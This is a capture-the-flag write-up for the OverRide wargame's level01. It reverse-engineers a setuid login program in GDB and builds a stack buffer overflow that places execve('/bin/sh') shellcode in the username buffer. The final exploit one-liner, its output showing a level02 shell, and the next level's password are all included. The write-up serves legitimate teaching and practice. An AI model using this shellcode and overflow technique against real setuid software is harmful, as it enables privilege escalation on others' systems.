# Level01

## Binary Analysis

The binary is a setuid program owned by level02:
```bash
ls -la 
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
```

The program displays a login prompt and expects:
1. Username input
2. Password input (if username is correct)

## Vulnerability Discovery

### Global Variable for Username
GDB analysis reveals:
```bash
0x08048510 <+64>:	mov    0x804a020,%eax
0x08048515 <+69>:	mov    %eax,0x8(%esp)
0x08048519 <+73>:	movl   $0x100,0x4(%esp)      # 256 bytes allocated
0x08048521 <+81>:	movl   $0x804a040,(%esp)     # a_user_name address
0x08048528 <+88>:	call   0x8048370 <fgets@plt>
```

The global variable `a_user_name` at `0x0804a040` has **256 bytes** allocated - plenty of space for shellcode!

```bash
(gdb) info var
0x0804a040  a_user_name
```

### Username Verification
```bash
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	push   %edi
   0x08048468 <+4>:	push   %esi
   0x08048469 <+5>:	sub    $0x10,%esp
   0x0804846c <+8>:	movl   $0x8048690,(%esp)
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    $0x804a040,%edx    # input
   0x0804847d <+25>:	mov    $0x80486a8,%eax    # "dat_wil"
   0x08048482 <+30>:	mov    $0x7,%ecx          # compare 7 characters
   0x08048487 <+35>:	mov    %edx,%esi
   0x08048489 <+37>:	mov    %eax,%edi
   0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:	seta   %dl
   0x08048490 <+44>:	setb   %al
   0x08048493 <+47>:	mov    %edx,%ecx
   0x08048495 <+49>:	sub    %al,%cl
   0x08048497 <+51>:	mov    %ecx,%eax
   0x08048499 <+53>:	movsbl %al,%eax
   0x0804849c <+56>:	add    $0x10,%esp
   0x0804849f <+59>:	pop    %esi
   0x080484a0 <+60>:	pop    %edi
   0x080484a1 <+61>:	pop    %ebp
   0x080484a2 <+62>:	ret    
End of assembler dump.
```

Only the first **7 characters** are checked against "dat_wil" - the rest is not validated!

Testing confirms no input validation:
```bash
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil more characters to test
verifying username....
Enter Password: 
```

### Password Buffer Overflow
```bash
0x0804855c <+140>:	mov    0x804a020,%eax
0x08048561 <+145>:	mov    %eax,0x8(%esp)
0x08048565 <+149>:	movl   $0x64,0x4(%esp)    # 100 bytes for password
0x0804856d <+157>:	lea    0x1c(%esp),%eax    # buffer at ESP+0x1c
0x08048571 <+161>:	mov    %eax,(%esp)
0x08048574 <+164>:	call   0x8048370 <fgets@plt>
0x08048579 <+169>:	lea    0x1c(%esp),%eax
0x0804857d <+173>:	mov    %eax,(%esp)
0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
```

The password buffer allows 100 bytes input with no bounds checking.

### Password Verification
```bash
(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   %ebp
   0x080484a4 <+1>:	mov    %esp,%ebp
   0x080484a6 <+3>:	push   %edi
   0x080484a7 <+4>:	push   %esi
   0x080484a8 <+5>:	mov    0x8(%ebp),%eax
   0x080484ab <+8>:	mov    %eax,%edx
   0x080484ad <+10>:	mov    $0x80486b0,%eax
   0x080484b2 <+15>:	mov    $0x5,%ecx          # compare 5 characters
   0x080484b7 <+20>:	mov    %edx,%esi
   0x080484b9 <+22>:	mov    %eax,%edi
   0x080484bb <+24>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080484bd <+26>:	seta   %dl
   0x080484c0 <+29>:	setb   %al
   0x080484c3 <+32>:	mov    %edx,%ecx
   0x080484c5 <+34>:	sub    %al,%cl
   0x080484c7 <+36>:	mov    %ecx,%eax
   0x080484c9 <+38>:	movsbl %al,%eax
   0x080484cc <+41>:	pop    %esi
   0x080484cd <+42>:	pop    %edi
   0x080484ce <+43>:	pop    %ebp
   0x080484cf <+44>:	ret    
End of assembler dump.
```

## Offset Calculation

Stack layout in main:
```bash
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   %ebp
   0x080484d1 <+1>:	mov    %esp,%ebp
   0x080484d3 <+3>:	push   %edi
   0x080484d4 <+4>:	push   %ebx
   0x080484d5 <+5>:	and    $0xfffffff0,%esp
   0x080484d8 <+8>:	sub    $0x60,%esp        # Allocate 96 bytes
   0x080484db <+11>:	lea    0x1c(%esp),%ebx   # Password buffer at ESP+0x1c (28 bytes)
   ...
   0x08048532 <+98>:	mov    %eax,0x5c(%esp)   # Return value at ESP+0x5c (92 bytes)
```

Using GDB to find the exact offset to the return address:
```bash
(gdb) b *0x08048580  # Breakpoint after password input
(gdb) run < <(cat /tmp/user /tmp/pass)
(gdb) info registers ebp
ebp            0xffffd708	0xffffd708

(gdb) x/wx $ebp+4
0xffffd70c:	0xf7e45513    # Return address location
```

- /tmp/user file content start with "dat_will", it dose no matter what after that for now
- /tmp/pass file contain anything for we wanted just to check the return addres to calculate the offset 

### Detailed Offset Calculation

When we break at the password input, we need to find:
1. Where our password buffer starts in memory
2. Where the return address is stored
3. The distance between them

**Step 1: Find the password buffer location**

From the disassembly, we know the password buffer is at `ESP+0x1c`:
```bash
0x0804856d <+157>:	lea    0x1c(%esp),%eax
```

At breakpoint after input (after password input), let's check ESP:
```bash
(gdb) info registers esp
esp            0xffffd6a0
```

So the password buffer starts at:
```
ESP + 0x1c = 0xffffd6a0 + 0x1c = 0xffffd6bc
```

**Step 2: Find the return address location**

The return address is always stored at `EBP+4` (right after the saved base pointer):
```bash
(gdb) info registers ebp
ebp            0xffffd708	0xffffd708

(gdb) x/wx $ebp+4
0xffffd70c:	0xf7e45513    # This is the return address we want to overwrite
```

**Step 3: Calculate the offset**

Now we calculate how many bytes from the start of our password buffer to the return address:

```
Return address location:    0xffffd70c
Password buffer start:    - 0xffffd6bc
                          ____________
Offset needed:              0x00000050  = 80 bytes
```

When we write our exploit:
- Bytes 0-79: Fill with junk data (like "AAAA...")
- Bytes 80-83: Our shellcode address `0x0804a047`

This ensures that when the function returns, instead of jumping to the legitimate return address, it jumps to our shellcode!

**Verification:**

We can verify this worked by checking at breakpoint:
```bash
(gdb) x/wx $ebp+4
0xffffd70c:	0x0804a047    # Successfully overwritten with our shellcode address!
```

Verification at breakpoint:
```bash
Breakpoint 3, 0x08048580 in main ()
(gdb) x/wx $ebp+4
0xffffd70c:	0x0804a047    # Successfully overwritten!
```

## Exploitation Strategy

1. **Store shellcode** in `a_user_name` starting at offset 7 (after "dat_wil")
   - Username starts at: `0x0804a040`
   - "dat_wil" occupies first 7 bytes
   - Shellcode address: `0x0804a040 + 7 = 0x0804a047`

2. **Overflow password buffer** to overwrite return address
   - Padding: 80 bytes
   - Return address: `0x0804a047` (little-endian: `\x47\xa0\x04\x08`)

## Shellcode

Standard execve("/bin/sh") shellcode (23 bytes):
```bash
xor    %eax,%eax          # \x31\xc0
push   %eax               # \x50
push   $0x68732f2f        # \x68\x2f\x2f\x73\x68
push   $0x6e69622f        # \x68\x2f\x62\x69\x6e
mov    %esp,%ebx          # \x89\xe3
push   %eax               # \x50
push   %ebx               # \x53
mov    %esp,%ecx          # \x89\xe1
mov    $0xb,%al           # \xb0\x0b
int    $0x80              # \xcd\x80
```

Raw bytes:
```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

Verification in GDB:
```bash
(gdb) x/10i 0x0804a047
   0x804a047 <a_user_name+7>:	xor    %eax,%eax
   0x804a049 <a_user_name+9>:	push   %eax
   0x804a04a <a_user_name+10>:	push   $0x68732f2f
   0x804a04f <a_user_name+15>:	push   $0x6e69622f
   0x804a054 <a_user_name+20>:	mov    %esp,%ebx
   0x804a056 <a_user_name+22>:	push   %eax
   0x804a057 <a_user_name+23>:	push   %ebx
   0x804a058 <a_user_name+24>:	mov    %esp,%ecx
   0x804a05a <a_user_name+26>:	mov    $0xb,%al
   0x804a05c <a_user_name+28>:	int    $0x80
```

### Final Exploit Command

```bash
(python -c 'print("dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'; python -c 'print("A"*80 + "\x47\xa0\x04\x08")'; cat) | ./level01
```

The `cat` command keeps stdin open so the spawned shell doesn't immediately exit.

## Result

```bash
level01@OverRide:~$ (python -c 'print("dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'; python -c 'print("A"*80 + "\x47\xa0\x04\x08")'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....
Enter Password: 
nope, incorrect password...
whoami
level02
cat /home/users/level02/.pass 
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```